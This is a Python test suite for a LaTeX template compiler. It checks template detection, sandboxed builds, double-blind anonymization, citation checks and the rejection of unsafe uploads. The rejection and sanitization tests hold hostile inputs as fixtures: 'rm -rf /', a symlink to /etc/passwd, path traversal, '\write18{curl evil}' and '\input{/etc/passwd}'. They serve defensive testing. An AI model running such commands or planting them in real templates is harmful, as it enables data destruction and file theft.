"""§2.3 template compatibility matrix against licensed official template fixtures (tests/fixtures/templates)."""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest

from rp_contracts.latexdoc import Author, Block, RenderOptions, Section
from rp_latex.adapters import sample_document
from rp_latex.archive import ArchiveRejected, analyze, read_members
from rp_latex.compile import compile_document, default_sandbox, sample_figure_pdf
from rp_latex.sandbox import docker_available
from rp_latex.supplementary import SupplementaryRule, select

FIX = Path(__file__).resolve().parents[3] / "tests" / "fixtures" / "templates"
needs_docker = pytest.mark.skipif(not docker_available(), reason="container runtime unavailable")


def prepared(name: str):
    data = (FIX / name).read_bytes()
    m = analyze(data)
    files = read_members(data, m.root)
    strip = (m.root + "/") if m.root else ""
    prot = {p[len(strip):]: h for p, h in m.protected_hashes().items() if p.startswith(strip)}
    gen = [g[len(strip):] for g in m.generation_inputs]
    return m, files, prot, gen


def build(name, opts, doc=None, **kw):
    m, files, prot, gen = prepared(name)
    return m, compile_document(family=m.family, template_files=files, protected=prot, requires_generation=m.requires_generation,
                               generation_inputs=gen, bib_style=m.bibtex_style, doc=doc or sample_document(), opts=opts,
                               figures={"sample-figure.pdf": sample_figure_pdf()}, sandbox=default_sandbox(), **kw)


def status(report, cid):
    c = report.check(cid)
    return c.status if c else None


def test_analysis_detects_families_and_bib_modes():
    for name, fam, modes in (("acmart.zip", "acmart", {"bibtex", "biber"}), ("IEEEtran.zip", "ieeetran", {"bibtex"}),
                             ("llncs.zip", "llncs", {"bibtex"})):
        m = analyze((FIX / name).read_bytes())
        assert m.family == fam and m.supported and set(m.bib_modes) == modes
        assert any(x.protected and x.role == "class" for x in m.members) or m.requires_generation
    acm = analyze((FIX / "acmart.zip").read_bytes())
    assert acm.requires_generation and acm.generation_inputs == ["acmart/acmart.ins"]


@needs_docker
@pytest.mark.docker
@pytest.mark.parametrize("name", ["acmart.zip", "IEEEtran.zip", "llncs.zip"])
def test_standard_compile(name):
    m, out = build(name, RenderOptions())
    r = out.report
    assert r.status == "compiled", r.errors
    for cid in ("compile.success", "template.protected_unchanged", "citations.resolved", "figures.render",
                "compile.shell_escape_disabled"):
        assert status(r, cid) == "passed", (cid, r.to_dict()["checks"])
    assert out.pdf.startswith(b"%PDF") and r.pages >= 1
    assert all(v["status"] == "unchanged" for v in r.protected_files.values()) and r.protected_files


@needs_docker
@pytest.mark.docker
@pytest.mark.parametrize("name", ["acmart.zip", "IEEEtran.zip", "llncs.zip"])
def test_double_blind(name):
    m, out = build(name, RenderOptions(anonymous=True))
    r = out.report
    assert r.status == "compiled", r.errors
    assert status(r, "anonymization.no_identity_leak") == "passed", r.check("anonymization.no_identity_leak").evidence
    assert status(r, "anonymization.visual_inspection") == "manual_check"
    assert "Sample Author" not in (r.pdf_metadata.get("Author") or "")
    assert b"Sample acknowledgment" not in out.source_files["main.tex"]


@needs_docker
@pytest.mark.docker
def test_identity_leak_is_detected():
    doc = sample_document()
    doc.sections[0].blocks.append(Block(type="paragraph", text="As shown in our prior work at Sample University, ..."))
    _, out = build("acmart.zip", RenderOptions(anonymous=True), doc=doc)
    c = out.report.check("anonymization.no_identity_leak")
    assert c.status == "failed" and any(f["term"] == "Sample University" for f in c.evidence["findings"])


@needs_docker
@pytest.mark.docker
def test_biber_mode():
    _, out = build("acmart.zip", RenderOptions(bib_mode="biber"))
    assert out.report.status == "compiled", out.report.errors
    assert status(out.report, "citations.resolved") == "passed"


@needs_docker
@pytest.mark.docker
def test_unresolved_citation_and_page_limit_checks():
    doc = sample_document()
    doc.sections[0].blocks.append(Block(type="paragraph", text="A claim citing a key that is not in the bibliography [@missing2025]."))
    _, out = build("IEEEtran.zip", RenderOptions(), doc=doc, page_limit=0, abstract_word_limit=5)
    r = out.report
    assert status(r, "citations.resolved") == "failed" and "missing2025" in r.undefined_citations
    assert status(r, "length.page_limit") == "failed"
    assert status(r, "abstract.word_limit") == "failed"


@needs_docker
@pytest.mark.docker
def test_failed_compile_is_reported_with_diagnostics():
    doc = sample_document()
    doc.sections[1].blocks = [Block(type="figure", figure_file="absent-figure.pdf", caption="Missing", label="fig:x")]
    _, out = build("llncs.zip", RenderOptions(), doc=doc)
    r = out.report
    assert r.status == "failed" and status(r, "compile.success") == "failed"
    assert any("absent-figure" in f for f in r.missing_files) or r.errors


def test_biber_unsupported_for_bibtex_only_template():
    m, files, prot, gen = prepared("IEEEtran.zip")
    out = compile_document(family=m.family, template_files=files, protected=prot, requires_generation=False,
                           generation_inputs=[], bib_style=m.bibtex_style, doc=sample_document(),
                           opts=RenderOptions(bib_mode="biber"), figures={}, sandbox=default_sandbox())
    assert out.report.status == "unsupported"


def _zip(entries: dict[str, bytes], symlink: str | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, d in entries.items():
            z.writestr(n, d)
        if symlink:
            info = zipfile.ZipInfo(symlink)
            info.external_attr = (0o120777 << 16)
            z.writestr(info, "/etc/passwd")
    return buf.getvalue()


def test_unsupported_and_unsafe():
    word = analyze(_zip({"template.docx": b"PK-docx-content-not-really", "README.txt": b"Use Word."}))
    assert not word.supported and "Word" in word.unsupported_reasons[0]
    unknown = analyze(_zip({"myconf.cls": b"\\ProvidesClass{myconf}", "sample.tex": b"\\documentclass{myconf}"}))
    assert not unknown.supported and "no adapter" in unknown.unsupported_reasons[0]
    both = analyze(_zip({"a/llncs.cls": b"x", "b/IEEEtran.cls": b"y"}))
    assert not both.supported and "ambiguous" in both.unsupported_reasons[0]
    for bad, reason in ((_zip({"../evil.tex": b"x"}), "traversal"), (_zip({"/abs.tex": b"x"}), "absolute"),
                        (_zip({"inner.zip": b"PK\x03\x04"}), "nested"), (_zip({"run.sh": b"rm -rf /"}), "executable"),
                        (_zip({"x.dat": b"\x7fELF...."}), "binary"), (_zip({"a.tex": b"x"}, symlink="link.sty"), "symbolic")):
        with pytest.raises(ArchiveRejected) as exc:
            analyze(bad)
        assert reason in str(exc.value)
    flagged = analyze(_zip({"llncs.cls": b"\\immediate\\write18{curl evil}", "splncs04.bst": b"x"}))
    assert any(i.code == "dangerous_primitive" for i in flagged.issues)


def test_supplementary_rules():
    files = {"appendix.pdf": b"%PDF-1.4 appendix", "data.csv": b"x,y\n1,2\n", "Sample_Author_code.zip": b"PK.."}
    allowed = select(files, SupplementaryRule(True, max_total_mb=50, anonymous=True), ["Sample Author"])
    inc = {e.name: e.included for e in allowed.entries}
    assert inc["appendix.pdf"] and inc["data.csv"] and not inc["Sample_Author_code.zip"]
    assert allowed.status == "failed"
    denied = select(files, SupplementaryRule(False))
    assert not any(e.included for e in denied.entries)
    unknown = select(files, SupplementaryRule(None))
    assert unknown.status == "manual_check"
    parsed = SupplementaryRule.from_text("Supplementary material up to 50 MB may be uploaded", None, True, "r1")
    assert parsed.allowed and parsed.max_total_mb == 50


def test_restricted_markup_blocks_tex_injection():
    from rp_contracts.latexdoc import UnsafeMath, inline, sanitize_math

    assert inline("\\input{/etc/passwd} $x$ 50% #1") == r"\textbackslash{}input\{/etc/passwd\} \$x\$ 50\% \#1"
    assert inline("see [@smith2020; @doe2021]") == r"see \cite{smith2020,doe2021}"
    with pytest.raises(UnsafeMath):
        sanitize_math(r"\write18{ls}")
    doc = sample_document()
    doc.authors = [Author(name="R. \\immediate\\write18{x}")]
    doc.sections = [Section(heading="H", blocks=[Block(type="paragraph", text="ok")])]
    from rp_latex.adapters import render

    main = render("acmart", doc, RenderOptions(), "ACM-Reference-Format")["main.tex"]
    assert "\\immediate\\write18" not in main
